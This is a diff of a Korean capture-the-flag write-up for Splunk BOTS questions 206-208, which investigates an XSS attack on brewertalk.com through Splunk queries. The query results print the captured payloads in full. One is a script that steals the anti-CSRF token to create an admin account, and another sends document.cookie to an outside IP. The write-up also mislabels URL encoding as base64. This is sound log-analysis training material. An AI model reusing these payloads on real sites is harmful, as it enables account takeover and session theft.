@@ -306,6 +306,56 @@ berwertalk.com에서 btun의 비밀번호는 무엇입니까 ?
 
 </details>
 
+XSS공격은 script를 이용한 공격입니다. 키워드 script가 있는 form_data를 조사해봅시다. 
+
+```
+sourcetype=stream:http "<script>"
+| dedup form_data
+| table _time form_data src_ip
+```
+
+
+|_time|form_data|src_ip|
+|---|---|---|
+|2017/08/16 15:19:17.163	|module=user-titles&action=edit&utid=2%22%3E%3Cscript%3E%0Awindow.onload%3Dfunction(e)%7B%0A%20%20var%20my_post_key%20%3D%20document.getElementsByName(%22my_post_key%22)%5B0%5D.value%0A%20%20console.log(my_post_key)%3B%0A%20%20var%20postdata%3D%20%22my_post_key%3D%22%2Bmy_post_key%2B%22%26username%3DkIagerfield%26password%3Dbeer_lulz%26confirm_password%3Dbeer_lulz%26email%3DkIagerfield%40froth.ly%26usergroup%3D4%26additionalgroups%5B%5D%3D4%26displaygroup%3D4%22%3B%2F%2FPost%20the%20Data%0A%20%20var%20url%20%3D%20%22http%3A%2F%2Fwww.brewertalk.com%2Fadmin%2Findex.php%3Fmodule%3Duser-users%26action%3Dadd%22%3B%0A%20%20var%20http%3B%0A%20%20http%20%3D%20new%20XMLHttpRequest()%3B%0A%20%20http.open(%22Post%22%2Curl)%3B%0A%0A%20%20http.setRequestHeader(%27Accept%27%2C%27text%2Fhtml%27)%3B%0A%20%20http.setRequestHeader(%27Content-type%27%2C%27application%2Fx-www-form-urlencoded%27)%3B%0A%20%20http.setRequestHeader(%27Accept%27%2C%27application%2Fxhtml%2Bxml%27)%3B%0A%20%20http.setRequestHeader(%27Accept%27%2C%27application%2Fxml%27)%3B%0A%20%20http.send(postdata)%3B%0A%20%20console.log(my_post_key)%3B%0A%7D%0A%3C%2Fscript%3E|71.39.18.125|
+|2017/08/15 23:36:34.915|action=activate&uid=-1&code=%22%3E%3Cscript%3Edocument.location%3D%22http%3A%2F%2F45.77.65.211%3A9999%2Fmicrosoftuserfeedbackservice%3Fmetric%3D%22%20%2B%20document.cookie%3B%3C%2Fscript%3E|71.39.18.125|
+|2017/08/12 09:49:00.520|action=activate&uid=-1&code=%22%3E%3Cscript%3Ealert(%27%EB%8C%80%EB%8F%99%27)%3C%2Fscript%3E|136.0.0.125|
+
+내용이 base64인코딩되어 있습니다. 
+```
+sourcetype=stream:http "<script>"
+| dedup form_data
+| eval decoded=urldecode(form_data) 
+| table _time decoded src_ip
+```
+
+|_time|decoded|src_ip|
+|---|---|---|
+|2017/08/16 15:19:17.163|module=user-titles&action=edit&utid=2"><script>
+window.onload=function(e){
+  var my_post_key = document.getElementsByName("my_post_key")[0].value
+  console.log(my_post_key);
+  var postdata= "my_post_key="+my_post_key+"&username=kIagerfield&password=beer_lulz&confirm_password=beer_lulz&email=kIagerfield@froth.ly&usergroup=4&additionalgroups[]=4&displaygroup=4";//Post the Data
+  var url = "http://www.brewertalk.com/admin/index.php?module=user-users&action=add";
+  var http;
+  http = new XMLHttpRequest();
+  http.open("Post",url);
+
+  http.setRequestHeader('Accept','text/html');
+  http.setRequestHeader('Content-type','application/x-www-form-urlencoded');
+  http.setRequestHeader('Accept','application/xhtml+xml');
+  http.setRequestHeader('Accept','application/xml');
+  http.send(postdata);
+  console.log(my_post_key);
+}
+</script>|71.39.18.125|
+|2017/08/15 23:36:34.915|action=activate&uid=-1&code="><script>document.location="http://45.77.65.211:9999/microsoftuserfeedbackservice?metric=" + document.cookie;</script>|71.39.18.125|
+|2017/08/12 09:49:00.520|action=activate&uid=-1&code="><script>('대동')</script>|136.0.0.125|
+
+쿼리 결과 중 '대동'이라는 글자를 발견할 수 있습니다.
+
+답 : 대동
+
 207	What was the value of the cookie that Kevin's browser transmitted to the malicious URL as part of a XSS attack? Answer guidance: All digits. Not the cookie name or symbols like an equal sign.
 
 <details>
@@ -313,12 +363,40 @@ berwertalk.com에서 btun의 비밀번호는 무엇입니까 ?
 
 </details>
 
-208	The brewertalk.com web site employed Cross Site Request Forgery (CSRF) techniques. What was the value of the anti-CSRF token that was stolen from Kevin Lagerfield's computer and used to help create an unauthorized admin user on brewertalk.com?
+kevin의 브라우저에서 XSS공격으로 인한 쿠키값이 탈취되었습니다. 키워드 kevin, "<\script>", cookie를 넣어 검색해 봅시다.
+
+```
+sourcetype=stream:http *kevin* "<script>" *cookie*
+```
+
+1개의 검색결과가 나왔습니다.
+
+내용 중 class="username">kevin</a></span>라는 항목이 있는것을 보니 kevin과 관련된 이벤트입니다.
+
+또, cookie 필드값은 다음과 같습니다.
+
+```
+mybb[lastvisit]=1502408189; mybb[lastactive]=1502408191; sid=4a06e3f4a6eb6ba1501c4eb7f9b25228; adminsid=9267f9cec584473a8d151c25ddb691f1; acploginattempts=0
+```
+
+여러개의 값 중 lastvisit이 마지막 방문시 쓰였던 쿠키값임을 알 수 있습니다.
+
+답 : 1502408189
+
+208	The brewertalk.com web site employed Cross Site Request Forgery (CSRF) techniques. What was the value of the anti-CSRF token that was stolen from Kevin Lagerfield's computer and used to help create an unauthorized admin user on brewertalk.com?  
+brewertalk.com 웹 사이트는 CSRF(Cross Site Request Forgery) 기술을 사용했습니다. Kevin Lagerfield의 컴퓨터에서 도난당하여 brewertalk.com에서 승인되지 않은 관리자를 생성하는 데 사용된 anti-CSRF 토큰 값은 무엇입니까?
 
 <details>
   <summary>hint#1</summary>
 
 </details>
+CSRF 토큰이란, CSRF공격 대응하기 위해 클라이언트에서 서버로 요청할때 실제 서버에서 허용한 요청이 맞는지 확인하기 위한 값을 말합니다.
+
+[csrf 토큰이란?](https://codevang.tistory.com/282)
+
+"input type="hidden" name="my_post_key" value="1bc3eab741900ab25c98eee86bf20feb"
+
+답 : 1bc3eab741900ab25c98eee86bf20feb
 
 209	What brewertalk.com username was maliciously created by a spearphishing attack?
 
